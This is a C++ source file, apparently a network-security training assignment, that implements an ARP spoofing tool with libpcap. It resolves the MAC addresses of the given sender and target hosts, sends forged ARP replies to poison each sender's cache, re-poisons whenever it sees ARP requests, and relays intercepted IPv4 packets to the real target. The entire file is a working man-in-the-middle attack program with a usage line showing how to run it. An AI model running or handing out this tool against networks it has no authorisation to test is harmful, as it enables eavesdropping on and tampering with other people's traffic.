#include <cstdio>
#include <cstring>
#include <stdlib.h>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#define BUF_SIZE 1024
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct EthIp4Packet final {
	EthHdr eth_;
	ipv4_header_t ip_;
};
#pragma pack(pop)

struct SpoofPairNode final {
	uint32_t sender_ip;
	uint32_t target_ip;
	Mac sender_mac;
	Mac target_mac;
	SpoofPairNode* next;
};

SpoofPairNode* create_spoof_pair_node(const char* sender_arg, const char* target_arg) {
	SpoofPairNode* node = (SpoofPairNode*)malloc(sizeof(SpoofPairNode));
	if (node == NULL) {
		return NULL;
	}

	Ip sender_ip(sender_arg);
	Ip target_ip(target_arg);
	node->sender_ip = sender_ip;
	node->target_ip = target_ip;
	node->sender_mac = Mac::nullMac();
	node->target_mac = Mac::nullMac();
	node->next = NULL;
	return node;
}

void append_spoof_pair_node(SpoofPairNode** head, SpoofPairNode** tail, SpoofPairNode* node) {
	if (*head == NULL) {
		*head = node;
		*tail = node;
		return;
	}

	(*tail)->next = node;
	*tail = node;
}

void free_spoof_pair_list(SpoofPairNode* head) {
	while (head != NULL) {
		SpoofPairNode* next = head->next;
		free(head);
		head = next;
	}
}

SpoofPairNode* find_pair_by_sender_mac(SpoofPairNode* head, const Mac& sender_mac) {
	for (SpoofPairNode* current = head; current != NULL; current = current->next) {
		if (current->sender_mac == sender_mac) {
			return current;
		}
	}
	return NULL;
}

SpoofPairNode* find_pair_by_target_ip(SpoofPairNode* head, const Ip& target_ip) {
	for (SpoofPairNode* current = head; current != NULL; current = current->next) {
		if (current->target_ip == target_ip) {
			return current;
		}
	}
	return NULL;
}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// from internet
bool get_my_mac(const char* dev, Mac* my_mac) {
	char path[BUF_SIZE];
	if (snprintf(path, sizeof(path), "/sys/class/net/%s/address", dev) < 0) {
		return false;
	}

	FILE* fp = fopen(path, "r");
	if (fp == nullptr) {
		fprintf(stderr, "failed to open %s\n", path);
		return false;
	}

	char mac_str[18] = {0};
	if (fgets(mac_str, sizeof(mac_str), fp) == nullptr) {
		fclose(fp);
		fprintf(stderr, "failed to read mac address from %s\n", path);
		return false;
	}
	fclose(fp);

	*my_mac = Mac(mac_str);
	return true;
}

// from internet
bool get_my_ip(const char* dev, Ip* my_ip) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) return false;

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		close(fd);
		return false;
	}
	close(fd);

	struct sockaddr_in* sin = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
	*my_ip = Ip(ntohl(sin->sin_addr.s_addr));
	return true;
}

bool get_mac_by_arp(pcap_t* pcap, const Mac& my_mac, const Ip& my_ip, const Ip& query_ip, Mac* query_mac) {
	EthArpPacket req_packet;
	req_packet.eth_.dmac_ = Mac::broadcastMac();
	req_packet.eth_.smac_ = my_mac;
	req_packet.eth_.type_ = htons(EthHdr::Arp);

	req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	req_packet.arp_.pro_ = htons(EthHdr::Ip4);
	req_packet.arp_.hln_ = Mac::Size;
	req_packet.arp_.pln_ = Ip::Size;
	req_packet.arp_.op_ = htons(ArpHdr::Request);
	req_packet.arp_.smac_ = my_mac;
	req_packet.arp_.sip_ = htonl(my_ip);
	req_packet.arp_.tmac_ = Mac::nullMac();
	req_packet.arp_.tip_ = htonl(query_ip);

	while (true) {
		int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
		if (send_res != 0) {
			fprintf(stderr, "failed to send arp request: %s\n", pcap_geterr(pcap));
			return false;
		}

		while (true) {
			struct pcap_pkthdr* header;
			const u_char* recv_packet;
			int recv_res = pcap_next_ex(pcap, &header, &recv_packet);

			if (recv_res == 0) break;
			if (recv_res == PCAP_ERROR || recv_res == PCAP_ERROR_BREAK) {
				fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
				return false;
			}
			if (header->caplen < sizeof(EthArpPacket)) continue;

			const EthArpPacket* recv_eth_arp = reinterpret_cast<const EthArpPacket*>(recv_packet);
			if (ntohs(recv_eth_arp->eth_.type_) != EthHdr::Arp) continue;
			if (ntohs(recv_eth_arp->arp_.op_) != ArpHdr::Reply) continue;
			if (ntohl(recv_eth_arp->arp_.sip_) != query_ip) continue;

			*query_mac = recv_eth_arp->arp_.smac_;
			return true;
		}
	}
}

bool fill_spoof_pair_macs(pcap_t* pcap, const Mac& my_mac, const Ip& my_ip, SpoofPairNode* pair) {
	Ip sender(pair->sender_ip);
	Ip target(pair->target_ip);

	if (!get_mac_by_arp(pcap, my_mac, my_ip, sender, &pair->sender_mac)) {
		return false;
	}
	if (!get_mac_by_arp(pcap, my_mac, my_ip, target, &pair->target_mac)) {
		return false;
	}
	return true;
}

bool spoof_sender_pair(const char* dev, const Mac& my_mac, const Ip& my_ip, const SpoofPairNode* pair) {
	Ip sender(pair->sender_ip);
	Ip target(pair->target_ip);
	std::string sender_text = std::string(sender);
	std::string target_text = std::string(target);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUF_SIZE, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return false;
	}

	if (pair->sender_mac.isNull() || pair->target_mac.isNull()) {
		fprintf(stderr, "macs not resolved for pair %s -> %s\n", sender_text.c_str(), target_text.c_str());
		pcap_close(pcap);
		return false;
	}

	EthArpPacket packet;
	packet.eth_.dmac_ = pair->sender_mac;
	packet.eth_.smac_ = my_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = my_mac;
	packet.arp_.sip_ = htonl(target);
	packet.arp_.tmac_ = pair->sender_mac;
	packet.arp_.tip_ = htonl(sender);

	bool success = true;
	for (int j = 0; j < 5; j++) {
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket failed for pair %s -> %s: %s\n", sender_text.c_str(), target_text.c_str(), pcap_geterr(pcap));
			success = false;
		}
	}

	pcap_close(pcap);
	return success;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0 ) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	Mac my_mac;
	if (!get_my_mac(dev, &my_mac)) {
		return EXIT_FAILURE;
	}
	Ip my_ip;
	if (!get_my_ip(dev, &my_ip)) {
		fprintf(stderr, "failed to get my ip from %s\n", dev);
		return EXIT_FAILURE;
	}

	SpoofPairNode* pair_list = NULL;
	SpoofPairNode* pair_tail = NULL;
	for (int i = 2; i < argc; i += 2) {
		printf("argv[%d] = %s, argv[%d] = %s\n", i, argv[i], i + 1, argv[i + 1]);
		SpoofPairNode* node = create_spoof_pair_node(argv[i], argv[i + 1]);
		if (node == NULL) {
			fprintf(stderr, "failed to build argument list\n");
			free_spoof_pair_list(pair_list);
			return EXIT_FAILURE;
		}

			append_spoof_pair_node(&pair_list, &pair_tail, node);
	}

	char resolve_errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* resolve_pcap = pcap_open_live(dev, BUF_SIZE, 1, 1, resolve_errbuf);
	if (resolve_pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, resolve_errbuf);
		free_spoof_pair_list(pair_list);
		return EXIT_FAILURE;
	}

	for (SpoofPairNode* current = pair_list; current != NULL; current = current->next) {
		if (!fill_spoof_pair_macs(resolve_pcap, my_mac, my_ip, current)) {
			fprintf(stderr, "failed to resolve macs for pair %u -> %u\n", current->sender_ip, current->target_ip);
			pcap_close(resolve_pcap);
			free_spoof_pair_list(pair_list);
			return EXIT_FAILURE;
		}
	}
	pcap_close(resolve_pcap);

	for (SpoofPairNode* current = pair_list; current != NULL; current = current->next) {
		if (current->sender_mac.isNull() || current->target_mac.isNull()) {
			free_spoof_pair_list(pair_list);
			return EXIT_FAILURE;
		}
		if (!spoof_sender_pair(dev, my_mac, my_ip, current)) {
			free_spoof_pair_list(pair_list);
			return EXIT_FAILURE;
		}
	}
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUF_SIZE, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		free_spoof_pair_list(pair_list);
		return EXIT_FAILURE;
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* recv_packet_const;
		u_char* recv_packet;
		int recv_res = pcap_next_ex(pcap, &header, &recv_packet_const);
		recv_packet = const_cast<u_char*>(recv_packet_const);

			if (recv_res == 0) continue;
			if (recv_res == PCAP_ERROR || recv_res == PCAP_ERROR_BREAK) {
				fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
				pcap_close(pcap);
				free_spoof_pair_list(pair_list);
				return EXIT_FAILURE;
			}
		if (header->caplen < sizeof(EthHdr)) continue;

		const EthHdr* recv_eth = reinterpret_cast<const EthHdr*>(recv_packet);
		if (ntohs(recv_eth->type_) == EthHdr::Arp) {
			SpoofPairNode* matched_pair;
			const EthArpPacket* recv_eth_arp = reinterpret_cast<const EthArpPacket*>(recv_packet);
			if (header->caplen < sizeof(EthArpPacket)) continue;

				// dest_mac == broadcast
				if (recv_eth_arp->eth_.dmac_.isBroadcast()) {
					// target_ip == tip or sip
					matched_pair = find_pair_by_target_ip(pair_list, ntohl(recv_eth_arp->arp_.tip_));
					if (matched_pair == NULL) {
						matched_pair = find_pair_by_target_ip(pair_list, ntohl(recv_eth_arp->arp_.sip_));
					}
					if (matched_pair == NULL) continue;
					if (!spoof_sender_pair(dev, my_mac, my_ip, matched_pair)) {
						pcap_close(pcap);
						free_spoof_pair_list(pair_list);
						return EXIT_FAILURE;
					}
					continue;
				}

			
				// src_mac == sender
				matched_pair = find_pair_by_sender_mac(pair_list, recv_eth_arp->arp_.smac_);
				if (matched_pair != NULL){
					// target_ip == target
					if (ntohl(recv_eth_arp->arp_.tip_) != matched_pair->target_ip) continue;
					if (!spoof_sender_pair(dev, my_mac, my_ip, matched_pair)) {
						pcap_close(pcap);
						free_spoof_pair_list(pair_list);
						return EXIT_FAILURE;
					}
					continue;
				}

			} else if (ntohs(recv_eth->type_) == EthHdr::Ip4) {
				if (header->caplen < sizeof(EthIp4Packet)) continue;

				EthIp4Packet* recv_eth_ip4 = reinterpret_cast<EthIp4Packet*>(recv_packet);
				// src_mac == sender_mac
				SpoofPairNode* matched_pair = find_pair_by_sender_mac(pair_list, recv_eth_ip4->eth_.smac_);
				if (matched_pair == NULL) continue;
				// dest_ip != my_ip
				if (ntohl(recv_eth_ip4->ip_.dest_ip) == my_ip) continue;
				recv_eth_ip4->eth_.smac_ = my_mac;
				recv_eth_ip4->eth_.dmac_ = matched_pair->target_mac;
				if (pcap_sendpacket(pcap, recv_packet, header->caplen) != 0) {
					fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(pcap));
					pcap_close(pcap);
					free_spoof_pair_list(pair_list);
					return EXIT_FAILURE;
				}
				
				continue;

		}
	}

	
		pcap_close(pcap);
		free_spoof_pair_list(pair_list);
		return EXIT_SUCCESS;
	}
